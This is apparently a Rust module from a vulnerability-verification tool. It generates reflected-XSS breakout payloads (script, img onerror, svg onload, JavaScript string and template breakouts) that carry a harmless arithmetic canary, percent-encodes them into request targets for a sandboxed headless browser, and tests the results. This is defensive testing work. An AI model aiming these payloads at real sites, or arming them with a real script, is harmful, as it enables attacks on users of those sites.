//! The payloads a server-reflected XSS is driven with, and the request targets they ride in. Pure —
//! the sandbox ([`super::sandbox`]) runs the app, navigates a headless browser to each target, and
//! reports whether the injected script executed. Each canary, when it runs, performs a runtime
//! arithmetic computation whose *result* (not the literal payload) is written into the page, so the
//! value only appears in the rendered DOM if the reflected input broke out of its context and the
//! browser executed it — a reflection that is escaped never computes the result.

use super::plan::{Entry, ReflectedXss};

/// One reflected-XSS attempt: the request target to navigate to and how to recognize a hit.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ReflectedAttempt {
    /// The path-and-query (or path) to request, relative to the app origin. The payload is already
    /// placed and percent-encoded; the sandbox prepends the loopback origin.
    pub request_target: String,
    /// The raw payload value (before percent-encoding), kept for the human-readable reproduction.
    pub payload: String,
    /// A short label for the injection context this breakout targets (`js-single-quote`,
    /// `html-script`, …), reported in the reproduction.
    pub context: &'static str,
    /// The decimal string the canary computes and writes into the page *only if it executes*. A
    /// product of two factors, so it never appears literally in the payload (`a*b`), the page source,
    /// or a merely-escaped reflection; finding it in the rendered DOM proves the script ran.
    pub exec_token: String,
}

/// One injection-context breakout: a label and a function from the canary call string to the payload
/// that places it in that context.
type Breakout = (&'static str, fn(&str) -> String);

/// The injection-context breakouts tried for a reflected XSS. Covers the common reflected-XSS
/// contexts: the value written into HTML element content, into a tag attribute, and interpolated into
/// a server-rendered inline `<script>` string. A breakout that does not match the real context is
/// neutralized by the server (escaped or re-encoded) and simply never executes.
const BREAKOUTS: &[Breakout] = &[
    ("html-script", |call| format!("<script>{call}</script>")),
    ("html-img", |call| format!("<img src=x onerror={call}>")),
    ("html-attr-double", |call| {
        format!("\"><script>{call}</script>")
    }),
    ("html-attr-single", |call| {
        format!("'><script>{call}</script>")
    }),
    ("html-attr-img", |call| {
        format!("\"><img src=x onerror={call}>")
    }),
    ("html-svg", |call| format!("<svg onload={call}>")),
    // Interpolated into a server-rendered inline script string. `encodeURIComponent` (a common,
    // insufficient defense here) leaves `' - . ( ) *` untouched, so a string-concatenation breakout
    // that computes with only those characters still executes.
    ("js-single-quote", |call| format!("'-{call}-'")),
    ("js-double-quote", |call| format!("\"-{call}-\"")),
    ("js-statement-single", |call| format!("';{call};//")),
    ("js-statement-double", |call| format!("\";{call};//")),
    ("js-template", |call| format!("${{{call}}}")),
];

/// The reflected-XSS attempts for a probe: each context breakout, carrying a canary that writes a
/// per-attempt computed token so one attempt's hit never confirms another's. `seed` (the probe
/// nonce) makes the tokens unique across findings in one run.
pub fn reflected_xss_attempts(probe: &ReflectedXss, seed: u32) -> Vec<ReflectedAttempt> {
    BREAKOUTS
        .iter()
        .enumerate()
        .map(|(index, (context, wrap))| {
            let (a, b) = factors(seed, index as u32);
            let product = u64::from(a) * u64::from(b);
            // `document.write(a*b)` renders the product into the page when the script runs. The source
            // reflection holds the literal `a*b`; only execution yields the product.
            let call = format!("document.write({a}*{b})");
            let payload = wrap(&call);
            let request_target = place_payload(&probe.entry, &probe.path, &payload);
            ReflectedAttempt {
                request_target,
                payload,
                context,
                exec_token: product.to_string(),
            }
        })
        .collect()
}

/// Two distinct ~5-digit factors derived from the seed and attempt index, so every attempt computes a
/// different product and the product is never a substring of the `a*b` the payload carries.
fn factors(seed: u32, index: u32) -> (u32, u32) {
    let mix = |salt: u32| {
        let h = seed
            .wrapping_mul(2_654_435_761)
            .wrapping_add(index.wrapping_mul(40_503))
            .wrapping_add(salt.wrapping_mul(2_246_822_519));
        10_007 + (h % 80_000)
    };
    let a = mix(1);
    let mut b = mix(7);
    if b == a {
        b = a + 2;
    }
    (a, b)
}

/// Places the percent-encoded payload into the request target for the probe's entry: a query
/// parameter, a path segment, or an appended URL segment. Any other `{slot}` in the path is filled
/// with a neutral `1` so the route still matches.
fn place_payload(entry: &Entry, path: &str, payload: &str) -> String {
    let encoded = percent_encode(payload);
    match entry {
        Entry::Query(name) => {
            let filled = fill_slots(path, None);
            format!("{filled}?{name}={encoded}")
        }
        Entry::PathParam(name) => fill_slots(path, Some((name, &encoded))),
        // The whole path is the input (a catch-all route): append the payload as a final segment.
        Entry::Url => format!("{}/{encoded}", fill_slots(path, None).trim_end_matches('/')),
        // The planner only yields the URL-placed entries above; fall back to a query so nothing panics.
        _ => format!("{}?x={encoded}", fill_slots(path, None)),
    }
}

/// Fills `{slot}` segments: the named payload slot with `value`, every other slot with a neutral `1`.
fn fill_slots(path: &str, payload_slot: Option<(&str, &str)>) -> String {
    path.split('/')
        .map(|segment| {
            if let Some(name) = segment.strip_prefix('{').and_then(|s| s.strip_suffix('}')) {
                match payload_slot {
                    Some((slot, value)) if slot == name => value.to_owned(),
                    _ => "1".to_owned(),
                }
            } else {
                segment.to_owned()
            }
        })
        .collect::<Vec<_>>()
        .join("/")
}

/// Percent-encodes a value for a URL query or path position: everything outside the unreserved set is
/// escaped, so the server receives exactly the payload after its own decode.
fn percent_encode(text: &str) -> String {
    let mut out = String::with_capacity(text.len() * 3);
    for byte in text.bytes() {
        match byte {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(byte as char);
            }
            other => out.push_str(&format!("%{other:02X}")),
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::verify::plan::Method;

    fn probe(entry: Entry, path: &str) -> ReflectedXss {
        ReflectedXss {
            method: Method::Get,
            path: path.to_owned(),
            entry,
        }
    }

    #[test]
    fn a_query_probe_places_an_encoded_payload_in_the_named_parameter() {
        let attempts =
            reflected_xss_attempts(&probe(Entry::Query("t".to_owned()), "/unsubscribe"), 1);
        assert_eq!(attempts.len(), BREAKOUTS.len());
        assert!(
            attempts
                .iter()
                .all(|a| a.request_target.starts_with("/unsubscribe?t="))
        );
        // The single-quote breakout — the one that survives `encodeURIComponent` — is present and its
        // payload is a string-concatenation break-out carrying the write canary.
        let js = attempts
            .iter()
            .find(|a| a.context == "js-single-quote")
            .unwrap();
        assert!(js.payload.starts_with("'-document.write(") && js.payload.ends_with(")-'"));
        // The percent-encoded single quote precedes the canary in the request target.
        assert!(js.request_target.contains("%27-document.write"));
    }

    #[test]
    fn the_exec_token_is_the_product_not_the_literal_factors() {
        let attempts = reflected_xss_attempts(&probe(Entry::Query("q".to_owned()), "/s"), 42);
        for attempt in &attempts {
            // The payload carries `a*b`; the token is their product and never appears literally in it.
            assert!(attempt.payload.contains('*'));
            assert!(!attempt.payload.contains(&attempt.exec_token));
            assert!(attempt.exec_token.chars().all(|c| c.is_ascii_digit()));
        }
        // Tokens are distinct across the attempts, so one breakout's hit cannot confirm another's.
        let mut tokens: Vec<&str> = attempts.iter().map(|a| a.exec_token.as_str()).collect();
        tokens.sort_unstable();
        tokens.dedup();
        assert_eq!(tokens.len(), attempts.len());
    }

    #[test]
    fn a_path_param_probe_fills_the_slot_and_neutralizes_others() {
        let attempts = reflected_xss_attempts(
            &probe(Entry::PathParam("name".to_owned()), "/u/{id}/{name}"),
            3,
        );
        let first = &attempts[0];
        assert!(first.request_target.starts_with("/u/1/"));
        assert!(!first.request_target.contains("{name}"));
        assert!(!first.request_target.contains("{id}"));
    }

    #[test]
    fn distinct_seeds_yield_distinct_tokens() {
        let a = reflected_xss_attempts(&probe(Entry::Query("t".to_owned()), "/p"), 1);
        let b = reflected_xss_attempts(&probe(Entry::Query("t".to_owned()), "/p"), 2);
        assert_ne!(a[0].exec_token, b[0].exec_token);
    }
}
